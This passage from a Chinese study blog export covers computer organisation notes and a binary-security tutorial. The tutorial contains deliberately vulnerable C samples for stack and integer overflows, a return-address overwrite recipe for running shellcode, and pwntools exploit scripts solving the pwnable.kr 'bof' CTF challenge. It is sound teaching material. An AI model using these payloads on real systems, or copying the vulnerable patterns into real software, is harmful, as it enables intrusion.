href="#3-字符串和字符串的表示方法" class="headerlink" title="3.字符串和字符串的表示方法"></a>3.字符串和字符串的表示方法</h2><ul><li>符号数据：字符信息用数据表示：ASCII等</li><li>字符表示方法用ASCII：用一个字节来表示，低7位用来编码（128），最高位位校验位【这里有ASCII表】</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论（1）</title>
      <link href="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"/>
      <url>/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-计算机的分类"><a href="#1-计算机的分类" class="headerlink" title="1.计算机的分类"></a>1.计算机的分类</h1><p>电子模拟计算机</p><p>电子数字计算机（电脑）（电子计算器）</p><h1 id="2-计算机的发展简史"><a href="#2-计算机的发展简史" class="headerlink" title="2.计算机的发展简史"></a>2.计算机的发展简史</h1><h2 id="1-计算机的五代变化"><a href="#1-计算机的五代变化" class="headerlink" title="1.计算机的五代变化"></a>1.计算机的五代变化</h2><p>第一代：电子管计算机–<strong>数据处理机</strong>开始得到应用</p><p>第二代：晶体管计算机–<strong>工业控制机</strong>开始得到应用</p><p>第三代：中小规模集成电路计算机–<strong>小型</strong>计算机开始出现</p><p>第四代：大规模和超大规模集成电路计算机–<strong>微型计算机</strong>开始出现</p><p>第五代：巨大规模集成电路计算机–<strong>单片计算机</strong>开始出现</p><h2 id="2-半导体存储器的发展"><a href="#2-半导体存储器的发展" class="headerlink" title="2.半导体存储器的发展"></a>2.半导体存储器的发展</h2><p>….</p><p>3.微处理器的发展</p><p>Intel公司微处理器的烟花</p><h2 id="4-计算机的性能指标"><a href="#4-计算机的性能指标" class="headerlink" title="4.计算机的性能指标"></a>4.计算机的性能指标</h2><ul><li>吞吐量</li></ul><p>表征一台计算机在某一个时间间隔内能处理的信息量</p><ul><li>响应时间</li></ul><p>表征从输入有效到系统产生响应之间的时间</p><ul><li>利用率</li></ul><p>在给定时间间隔内系统被实际使用的时间所占用的比率</p><ul><li>处理机字长</li></ul><p>32位或者64位</p><ul><li>总线宽度</li></ul><p>CPU中运算器和存储器之间进行互联的内部总线二进制位数</p><ul><li>存储器容量</li></ul><p>存储单元的总数量GB TB</p><ul><li>存储器宽带</li></ul><p>单位时间内从存储器读取的二进制数信息量，一般用<strong>字节数/秒</strong>来表示</p><ul><li>主频/时钟周期</li></ul><p>CPU的工作节拍受主时钟控制，主时钟不断产生固定频率的时钟，主时钟的频率叫<strong>CPU的主频</strong>。单位是MHz 或者 GHz</p><ul><li>CPU的执行时间</li></ul><p>表示CPU执行一般程序所占用的CPU时间。CPU的执行时间=CPU时钟周期数XCPU时钟周期</p><ul><li>CPI</li></ul><p>表示每条指令周期数，也就是执行一条指令所需要的平均时钟周期数。CPI = 执行某段程序所需的CPU时钟周期数 / 程序包含的指令条数</p><ul><li>MIPS</li></ul><p>表示平均每秒执行多少百万条定点指令数</p><ul><li>FLOPS</li></ul><p>表示每秒执行浮点操作的次数，用来衡量机器浮点操作的性能。</p><h1 id="3-计算机的硬件"><a href="#3-计算机的硬件" class="headerlink" title="3.计算机的硬件"></a>3.计算机的硬件</h1><h2 id="1-组成部分"><a href="#1-组成部分" class="headerlink" title="1.组成部分"></a>1.组成部分</h2><p><strong>运算器</strong>   </p><p><strong>存储器</strong></p><p><strong>输入和输出设备</strong></p><p><strong>控制器</strong></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527191538749.png" alt="image-20230527191538749"></p><h2 id="2-运算器"><a href="#2-运算器" class="headerlink" title="2.运算器"></a>2.运算器</h2><ul><li><p>算术运算和逻辑运算</p></li><li><p>在计算机中参与运算的数是二进制的</p></li><li><p>运算器的长度一般是8、16、32或64位</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527191644407.png" alt="image-20230527191644407"></p><h2 id="3-存储器"><a href="#3-存储器" class="headerlink" title="3.存储器"></a>3.存储器</h2><ul><li>存储数据和程序（指令）</li><li>容量（存储单元、存储单元地址、容量单位）</li><li>分类内存（ROM、RAM）、外存</li><li><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527191805611.png" alt="image-20230527191805611"></li></ul><h2 id="4-控制器"><a href="#4-控制器" class="headerlink" title="4.控制器"></a>4.控制器</h2><ul><li>指令和程序:指令的形式（操作和地址码、存储程序的概念、指令中程序和数据的存放、指令系统）</li><li>指令和数据存储</li></ul><h3 id="控制器的基本任务"><a href="#控制器的基本任务" class="headerlink" title="控制器的基本任务"></a>控制器的基本任务</h3><ul><li><p>控制器的基本任务：按照一定的顺序一条接着一条取指令、指令译码、执行指令。取指周期和执行周期</p></li><li><p>控制器完全可以区分开哪些是指令字，哪些是数据字。一般来讲，取指周期中从内存读出的信息流是指令流，它流向控制器；而在执行器周期中从内存读出的信息流是数据流，它由内存流向运算器。</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527192404998.png" alt="image-20230527192404998"></p><h2 id="5-指令流和数据流"><a href="#5-指令流和数据流" class="headerlink" title="5.指令流和数据流"></a>5.指令流和数据流</h2><p>一般来说，在<strong>取指周期</strong>中从内存读出的信息流是<strong>指令流</strong>，它流向控制器。在<strong>执行周期</strong>中从内存读出的信息流是<strong>数据流</strong>。</p><h2 id="6-适配器与I-O设备"><a href="#6-适配器与I-O设备" class="headerlink" title="6.适配器与I/O设备"></a>6.适配器与I/O设备</h2><ul><li>输入设备</li></ul><p>把人们所熟悉的某种信息形式变换为机器内部所能接收和识别的二进制信息形式</p><ul><li>输出设备</li></ul><p>把计算机处理的结果变换为人或其他机器设备所能接收和识别的信息形式</p><ul><li>适配器</li></ul><p>它使得被连接的外围设备通过系统总线与主机进行联系，以便使主机和外围设备并行协调地工作</p><ul><li>总线</li></ul><p>构成计算机系统的骨架，是多个系统部件之间进行数据传送的公共通路。</p><p><strong>总之</strong></p><p>现代电子计算机是由<strong>运算器、存储器、控制器、适配器、总线和输入/输出设备</strong>组成的。这也是人们常说的计算机硬件。</p><h1 id="4-计算机的软件"><a href="#4-计算机的软件" class="headerlink" title="4.计算机的软件"></a>4.计算机的软件</h1><h2 id="1-软件的组成与分类"><a href="#1-软件的组成与分类" class="headerlink" title="1.软件的组成与分类"></a>1.软件的组成与分类</h2><ul><li>系统软件</li></ul><p>用来简化程序设计，简化使用方法，提高计算机的使用效率，发挥和扩大计算机的功能及用途。</p><ul><li><p><input checked="" disabled="" type="checkbox">  各种服务性程序，如诊断程序、排错程序、练习程序等</p></li><li><p><input checked="" disabled="" type="checkbox">  语言程序，如汇编程序、编译程序、解释程序等</p></li><li><p><input checked="" disabled="" type="checkbox">  操作系统</p></li><li><p><input checked="" disabled="" type="checkbox">  数据库管理系统</p></li><li><p>应用软件</p></li></ul><p>用户利用计算机来解决某些问题而编制的程序，如工程设计程序、数据处理程序、自动控制程序、企业管理程序、情报检索程序科学计算程序等</p><h2 id="2-软件的发展演变"><a href="#2-软件的发展演变" class="headerlink" title="2.软件的发展演变"></a>2.软件的发展演变</h2><ul><li><p>编程语言的发展</p><ol><li>手编程序：机器语言程序，手工编译二进制码</li><li>汇编程序：符号语言程序，汇编程序汇编</li><li>高级程序：算法语言/高级语言，机器编译程序/解释程序</li></ol></li><li><p>系统软件的发展</p><ol><li>操作系统</li><li>分布式系统软件</li></ol></li></ul><h1 id="5-计算机系统的层次结构"><a href="#5-计算机系统的层次结构" class="headerlink" title="5.计算机系统的层次结构"></a>5.计算机系统的层次结构</h1><h2 id="1-多级组成的计算机系统"><a href="#1-多级组成的计算机系统" class="headerlink" title="1.多级组成的计算机系统"></a>1.多级组成的计算机系统</h2><p>计算机是一个十分复杂的硬、软件结合而成的整体。</p><p>五个以上不同的级组成</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527195739559.png" alt="image-20230527195739559"></p><ul><li>第一级是微程序设计级</li></ul><p>这是一个实在的硬件级，它由机器硬件直接执行<strong>微指令</strong>。如果某一个应用程序直接用微指令来编写，那么可在这一级上运行应用程序。</p><ul><li>第二级是一般机器级</li></ul><p>也称为机器语言级，它由微程序解释机器指令系统。这一级也是硬件级。</p><ul><li>第三级是操作系统级</li></ul><p>它由操作系统程序实现。这些操作系统由<strong>机器指令</strong>和<strong>广义指令</strong>组成，广义指令是操作系统定义和解释的软件指令，所以这一级也称为混合级。</p><ul><li>第四级是汇编语言级</li></ul><p>它给程序人员提供一种符号形式语言，以减少程序编写的复杂性。这一级由汇编程序支持和执行。如果应用程序采用汇编语言编写时，则机器必须要有这一级的功能；如果应用程序不采用汇编语言编写，则这一级可以不要。</p><ul><li>第五级是高级语言级</li></ul><p>它是面向用户的，为方便用户编写应用程序而设置的。这一级由各种高级语言编译程序支持和执行。</p><h2 id="2-软件与硬件的逻辑等价性"><a href="#2-软件与硬件的逻辑等价性" class="headerlink" title="2.软件与硬件的逻辑等价性"></a>2.软件与硬件的逻辑等价性</h2><ul><li><p>随着大规模集成电路技术的发展和软件硬化的趋势，计算机系统的软、硬件界限已经变得模糊了。因为任何操作可以由软件来实现，也可以由硬件来实现；任何指令的执行可以由硬件完成，也可以由软件来成。</p></li><li><p>任何操作可以由软件来实现也可以有硬件来实现（设计计算机系统时，应考虑各个方面的因素：价格、速度、可靠性、存储容量、变更周期）</p></li><li><p>实体硬件机功能的扩大。【把原来明显在一般机器级通过编制程序的实现的操作直接改为硬件操作】</p></li><li><p>固件的概念（功能上是软件，形态上是硬件）</p></li></ul><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>上面的都已经是总结了。</p><p> 计算机系统的基本概念</p><p> 构成：硬件和软件</p><p> 层次结构</p><p> 计算机系统的基本工作原理</p><p> 计算机的基本组成部分</p><p> 五大部件</p><p> 冯·诺依曼型计算机特点</p><p> 计算机发展特点</p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>阅读必看（0）</title>
      <link href="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-0-%E9%98%85%E8%AF%BB%E5%BF%85%E7%9C%8B/"/>
      <url>/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-0-%E9%98%85%E8%AF%BB%E5%BF%85%E7%9C%8B/</url>
      
        <content type="html"><![CDATA[<p>该内容主要是：《计算机组成原理》—白中英</p><p>该笔记主要取决于我在无聊或者其他学累了过后所写，内容均来自上面这本书。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制安全漏洞之缓冲区溢出（32）</title>
      <link href="/2023/05/26/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-32-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/"/>
      <url>/2023/05/26/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-32-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出漏洞基本原理"><a href="#栈溢出漏洞基本原理" class="headerlink" title="栈溢出漏洞基本原理"></a>栈溢出漏洞基本原理</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>栈溢出是缓冲区溢出的一种</p><p>缓冲区溢出是：一种长数据向小的缓冲区复制，导致数据超出了小缓冲区，导致其他的数据被破坏。这就是缓冲区溢出。</p><p><strong>手法</strong></p><p>1.先决条件，栈局部变量可控制，存在溢出（strcpy）</p><p>2.通过栈空间的布置，布置shellcode，并使用shellcode起始地址来覆盖栈帧的ret addr【返回地址】</p><p>3.Payload = [Nop sled + ] Shellcode + Pad + Shellcode’s Addr</p><p>但是：Shellcode地址在不同PC上不确定</p><p><strong>来看一个有问题的代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vul_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!(fp = fopen(<span class="string">&quot;input.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,<span class="number">1024</span>,<span class="number">1</span>,fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:%s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fread时，指定的长度1024超过了buf尺寸。</p><p>输入数据长度可控，在input.txt中</p><p>可以精心操纵input.txt，对buf进行溢出布置shellcode、覆盖ret addr。</p><ol><li>确定栈帧布局，计算出buf到ret addr的offset【偏移地址】</li><li>先对buf填充无效数据，通过调试找出buf的首地址并覆盖ret addr。</li><li>用一段shellcode填充buf，这段shellcode会弹一个shell</li><li>IDA或者gdb找出buf距离ret addr的offset。</li><li>gdb找出buf起始的地址。</li><li>python –c ‘”A”<em>76+”B”</em>4+”\xdc\xee\xff\xbf”’ &gt; input.txt</li><li>替换”A”*76为shellcode+pads</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p> pwnable.KR bof</p><p>【win10 虚拟机 2023.5.26-  bof】</p><p>这个是一个32位的lunix下的一个文件</p><p>可以用IDA的，但是这里我们用r2 ，复习和巩固一下基础的用法。</p><p>进去先用aaa简单分析一下啊</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224439451.png" alt="image-20230526224439451"></p><p>这里看到了又mian函数，看看mian函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224513452.png" alt="image-20230526224513452"></p><p>这里main函数call 了 这个 sym.func 这个函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231828692.png" alt="image-20230526231828692"></p><p>首先看到下面这个  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword [arg_8h], 0xcafebabe</span><br></pre></td></tr></table></figure><p>这里就是比较的地方</p><p>起始这里用IDA中的F5看起来要直观一点【我觉得，我可能功力不够】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231940738.png" alt="image-20230526231940738"></p><p>这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 0xCAFEBABE )</span><br></pre></td></tr></table></figure><p>也就是上面的cmp</p><p>从r2中可以看到这个get(s)的空间是：0x2c 也就是44</p><p>但是IDA中 get(s)        char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF</p><p>在IDA中看到是32 ， 它和r2中的44 大小不一样，why？</p><p>很明显，这里r2中看的是汇编，但是在IDA中看到的是伪代码，伪代码中间把指针存放的大小没有考虑进去，所以我们需要看的是汇编中的代码</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526232645012.png" alt="image-20230526232645012"></p><p>这样一来就是0x2c了</p><p>然后下面要比较的字符串，占用的空间是8，所以我们需要溢出的空间是44+8=52</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">44</span>+<span class="number">8</span>) + p64(<span class="number">0x0CAFEBABE</span>)</span><br><span class="line"><span class="comment">#b&#x27;a&#x27;*(44+8) 这个地方是需要溢出的空间的大小</span></span><br><span class="line"><span class="comment">#p64(0x0CAFEBABE) 这个是那个比较函数的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526234150173.png" alt="image-20230526234150173"></p><p>【这里因为这个kali pwn 的环境一直搭不上…用的ubuntu】</p><p>官方payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwnable.kr&quot;,9000)</span></span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span></span><br><span class="line">payload+=p64(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="整数溢出的一本原理"><a href="#整数溢出的一本原理" class="headerlink" title="整数溢出的一本原理"></a>整数溢出的一本原理</h1><h2 id="基本知识-1"><a href="#基本知识-1" class="headerlink" title="基本知识"></a>基本知识</h2><p>如果一个整数用来计算一些铭感数值，比如：缓冲区大小或数值索引就会参数一些可能的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出</p><p><strong>出现异常的三种情况</strong></p><ol><li><strong>溢出</strong>：整数溢出需要和有符号的数才会溢出有符号数的最高位表示符号，在2个正数或者负数相加的时候，有可能改变符号位的值，产生溢出。溢出标志OF可检测有符号数的溢出</li><li><strong>回绕</strong>：无符号数0-1的时候会变成最大的数字，比如1字节的无符号数会变成255，而255+1会变成最小数0。进位标志CF可检测无符号数的回绕</li><li><strong>截断</strong>：将一个较大宽度的数存入一个宽度小的操作数中，高位就会发生截断</li></ol><h3 id="有符号整数"><a href="#有符号整数" class="headerlink" title="有符号整数"></a>有符号整数</h3><p>这一类整数用于表示正值、负值和零，范围取决于为该类型分配的位数及其表示方式（原码、反码、补码)。当有符号数的运算结果不能用结果类型表示时就会发生溢出，可以分为上溢出和下溢出两种。</p><ul><li><strong>上溢出</strong>：往上的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i = 2147483647;</span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">//i=-2147483648</span><br></pre></td></tr></table></figure><ul><li><strong>下溢出</strong>：往下的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i=-2147483648；</span><br><span class="line">i--;</span><br><span class="line"></span><br><span class="line">//i = 2147483647;</span><br></pre></td></tr></table></figure><h3 id="整数提升"><a href="#整数提升" class="headerlink" title="整数提升"></a>整数提升</h3><p>是指：当计算表达式中包含了不同宽度的操作数的时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="memcpy-函数"><a href="#memcpy-函数" class="headerlink" title="memcpy()函数"></a>memcpy()函数</h3><p>将src所指向的字符串中以src地址开始前n个字节复制到dest所指向的数组中，并且返回dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">viod *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="strncpy-函数"><a href="#strncpy-函数" class="headerlink" title="strncpy()函数"></a>strncpy()函数</h3><p>从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest , <span class="type">const</span> <span class="type">char</span> *src , <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="整数转换"><a href="#整数转换" class="headerlink" title="整数转换"></a>整数转换</h3><p>如果攻击者给len赋予一个负数，则可以绕过if语句的检测，执行到memcpy()的时候，由于第三个参数是size_t类型，负数len会被转化为无符号整型，于是就变成了一个很大的正数。从而复制大量的内容到buf中，引发缓冲区溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        error(<span class="string">&quot;length too large:bad god, no cookie for you&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,p,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回绕和溢出"><a href="#回绕和溢出" class="headerlink" title="回绕和溢出"></a>回绕和溢出</h3><p>当len过大的时候，len+5有可能发生回绕</p><p>比如，在x86-32上，如果len=0xFFFFFFFF，则len+5=0x00000004，这时malloc()只分配了4字节内存，然后在里面写入大量数据，就发生了缓冲区溢出。（如果将len声明为有符号int类型，len+5可能发生溢出）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">size_t</span> len;<span class="comment">//int len</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len+<span class="number">5</span>);</span><br><span class="line">    read(fd,buf,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是因为malloc 这个函数和前面的int len 发生了思想上的错误所导致的错误。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527011321973.png" alt="image-20230527011321973"></p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这个例子接受两个字符串类型的参数并计算总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串复制到缓冲区，然后将第二个字符串连接到尾部。此时如果攻击者提供的两个字符串总长度无法用total表示，就会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>])+<span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    strcopy(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    strcopy(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line"><span class="type">char</span> passwd_buf[<span 